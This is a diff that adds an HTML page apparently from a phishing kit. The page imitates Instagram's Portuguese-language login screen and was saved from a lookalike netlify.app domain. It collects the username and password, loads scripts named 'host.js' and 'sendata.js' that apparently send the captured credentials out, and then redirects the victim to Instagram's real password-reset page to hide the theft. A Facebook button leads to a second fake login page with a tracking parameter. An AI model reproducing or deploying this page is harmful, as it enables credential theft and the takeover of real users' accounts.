@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<!-- saved from url=(0047)https://www-accounts-suports-login.netlify.app/ -->
+<html lang="pt-br"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="shortcut icon" href="https://www-accounts-suports-login.netlify.app/instagram-icone-icon-1.png" type="image/x-icon">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      width: 350px;
+      padding: 40px 40px 20px;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 30px;
+    }
+
+    .logo img {
+      width: 175px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+    }
+
+    button {
+      width: 100%;
+      background-color: #0095f6;
+      color: white;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .divider span {
+      margin: 0 10px;
+      color: #8e8e8e;
+      font-size: 13px;
+    }
+
+    .facebook-login {
+      color: #385185;
+      font-weight: bold;
+      margin-top: 10px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .facebook-login a{
+        text-decoration: none;
+        color: #385185;
+    }
+
+    .forgot {
+      color: #00376b;
+      font-size: 12px;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+
+    .signup-box {
+      margin-top: 20px;
+      padding: 20px;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+      font-size: 14px;
+      background: white;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    .app-links {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .app-links img {
+      height: 40px;
+      margin: 5px;
+    }
+
+    input:focus{
+            outline: 1px solid rgb(156, 155, 155);
+    }
+    .forgot a{
+          text-decoration: none;
+          color: #385185;
+          font-size: 13px;
+    }
+
+    @media (max-width: 800px) {
+        body{
+            background-color: white;
+        }
+
+        .logo img{
+          width: 200px;
+        }
+        .container{
+            border: none;
+            padding: 2px 2px 20px;
+            
+        }
+        input{
+            width: 100%;
+            height: 45px;
+        }
+        #entrar{
+          height: 45px;
+          font-size: 17px;
+          background-color: #53bdeb;
+          border-radius: 10px;
+        }
+        
+        .signup-box {
+          border: none;
+        }
+        .facebook-login a{
+          color: #53bdeb;
+          font-size: 17px;
+        }
+        .signup-box a{
+          color: #53bdeb;
+        }
+
+      
+    }
+
+  </style>
+</head>
+<body cz-shortcut-listen="true">
+
+  <div>
+    <div class="container">
+      <div class="logo">
+        <img src="./Instagram_files/Instagram-Logo.png" alt="Instagram Logo">
+      </div>
+    
+        <input type="text" placeholder="Telefone, nome de usuário ou email" class="inputName">
+        <input type="password" placeholder="Senha" class="inputPass">
+        <input type="text" value="instagram" class="platform" style="display: none;">
+        <button id="entrar" class="enviar">Entrar</button>
+
+      <div class="divider"><span>OU</span></div>
+
+      <div class="facebook-login" id=""><a href="#" class="facebook">Entrar com Facebook</a></div>
+      <div class="forgot"><a href="https://www.instagram.com/accounts/password/reset/">Esqueceu a senha?</a></div>
+    </div>
+
+    <div class="signup-box">
+      Não tem uma conta? <a href="https://www-accounts-suports-login.netlify.app/#">Cadastre-se</a>
+    </div>
+
+    <div class="app-links">
+      <p>Obtenha o aplicativo.</p>
+      <img src="./Instagram_files/tUzYKZ-xrQK.png" alt="Google Play">
+      <img src="./Instagram_files/QQnPXT5YsC4.png" alt="App Store">
+    </div>
+  </div>
+  <script src="./Instagram_files/axios.min.js.baixados"></script>
+ 
+  <script src="../host.js"></script>
+  <script src="../sendata.js"></script>
+  <script> 
+  let ref =  params.get('ref')
+  console.log(ref)
+  document.addEventListener("click",(e)=>{
+    //let ref =  params.get('ref')
+    if(e.target.id === "entrar"){
+      setTimeout(() => {
+        location.href = "https://www.instagram.com/accounts/password/reset/"
+      }, 500);
+    }
+
+     if(e.target.classList[0] === 'facebook'){
+        console.log('fb')
+          location.href = `/d/facebook.com/login.html?ref=${ref}`
+      }
+       
+
+  }) 
+
+  
+  
+  </script>
+
+  
+
+</body>
+</html>
